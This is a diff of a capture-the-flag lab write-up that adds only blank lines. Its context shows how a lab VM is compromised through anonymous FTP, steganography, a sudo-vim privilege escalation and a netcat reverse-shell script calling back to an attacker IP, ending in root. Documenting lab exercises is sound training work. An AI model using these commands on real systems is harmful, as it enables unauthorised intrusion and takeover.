@@ -95,6 +95,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
 [Pentesting FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
 
 [**#Anonymous login**]
+
 _anonymous : anonymous_ _anonymous :_ _ftp : ftp_
 ```
 ftp <IP>
@@ -107,6 +108,7 @@ ftp <IP>
 ```
 
 `mkdir ./ftp_files && cd ./ftp_files`
+
 `ftp 192.168.56.130`:
 ```                  
 Connected to 192.168.56.130.
@@ -155,16 +157,19 @@ StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 ```
 
 `mv ./secret.jpg.out ./more_secret.txt`
+
 `cat ./more_secret.txt`:
 ```
 <-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:
 ```
 
 `https://cyberchef.org/#recipe=From_Base85('!-u',true,'z')&input=PC1NbmtGRW8hU0FSVFYjK0QsWTREJzNfN0c5RDBMRldibUJDaHQ1J0FLWWkuRWItQShCbGReJUUsVEguRkNldSpAWDApPEJPcjwuQlBEP3NGISxSPEA8PFc7RGZtMTVCazIqL0Y8Rys0K0VWOipEQk5ENitFVjouK0UpLi9GISxhSEZXYjQvQTA%2BRSQvZyspMitFVjo7RGcqPUJBbkUwLUJPcjtxRGctIzNESW1sQStCKV1fQ2BtLzFAPGl1LUVjNWU7RkQsNS5GKCZabCtEPjIoQFctOT4rQEJSWkBxWyEsQk9yPC5FYWBLaStFcU87QTkvbC1EQk80Q0ZgSlVHQDswUCEvZypULUUsOUg1QU0sKW5FYi9aci9nKlByRig5LTNBVEJDMUUrczMqM2AnTy5DR14qL0JrSlw6`
+
 `CyberChef Input`:
 ```
 <-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:
 ```
+
 `CyberChef Output`:
 ```
 Twenty years from now you will be more disappointed by the things that you didn't do than by the ones you did do. So throw off the bowlines. Sail away from the safe harbor. Catch the trade winds in your sails. Explore. Dream. Discover.
@@ -318,6 +323,7 @@ ssh: connect to host 192.168.56.130 port 22: Connection refused ←
 [Pentesting IPv6](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/pentesting-ipv6)
 
 [**#Networks**]
+
 IPv6 addresses are structured to enhance network organization and device interaction. An IPv6 address is divided into:
 1. **Network Prefix**: The initial 48 bits, determining the network segment.
 2. **Subnet ID**: Following 16 bits, used for defining specific subnets within the network.
@@ -422,6 +428,7 @@ Codename:       bullseye
 ```
 
 `cd /home/pink`
+
 `ls -alps ./`:
 ```
 total 32
@@ -447,6 +454,7 @@ total 828
 ```
 
 `cd /var/www/html`
+
 `cat ./index.html`:
 ```html
 <!DOCTYPE html>
@@ -462,6 +470,7 @@ total 828
 </body>
 </html>
 ```
+
 `cat ./index.html.bak`:
 ```html
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
@@ -633,6 +642,7 @@ lrwxrwxrwx 1 root root 21 Jan 27  2023 /usr/bin/vim -> /etc/alternatives/vim
 [vim](https://gtfobins.github.io/gtfobins/vim/)
 
 [**#Sudo**]
+
 If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
 1. 
 ```
@@ -657,6 +667,7 @@ green ←
 ```
 
 `cd /home/green`
+
 `ls -alps`:
 ```
 total 48
@@ -751,6 +762,7 @@ q
 ```
 
 `chmod +x ./test_4_green`
+
 `./test_4_green`:
 ```
 Guess the number im thinking: 1
@@ -773,6 +785,7 @@ purple ←
 ```
 
 `cd /home/purple`
+
 `ls -alps`:
 ```
 total 32
@@ -845,6 +858,7 @@ netgroup:       nis
 ```
 -rw-r--r-- 1 root root 185 Jan 27  2023 /etc/hosts ←
 ```
+
 `cat /etc/hosts`:
 ```
 127.0.0.1       localhost
@@ -860,6 +874,7 @@ ff02::2 ip6-allrouters
 ```
 -rw-r--r-- 1 root root 48 Feb 20  2023 /etc/resolv.conf ←
 ```
+
 `cat /etc/resolv.conf`:
 ```
 nameserver 192.168.56.1 ←
@@ -868,6 +883,7 @@ nameserver 192.168.56.1 ←
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `mkdir ./http_server && cd ./http_server`
+
 `echo -e '#!/bin/bash\nnc -e /bin/bash 192.168.56.118 7777' | tee ./attack.sh`:
 ```
 #!/bin/bash
@@ -937,6 +953,7 @@ uid=0(root) gid=0(root) grupos=0(root) ←
 ```
 
 `cd /root`
+
 `ls -alps`:
 ```
 total 40
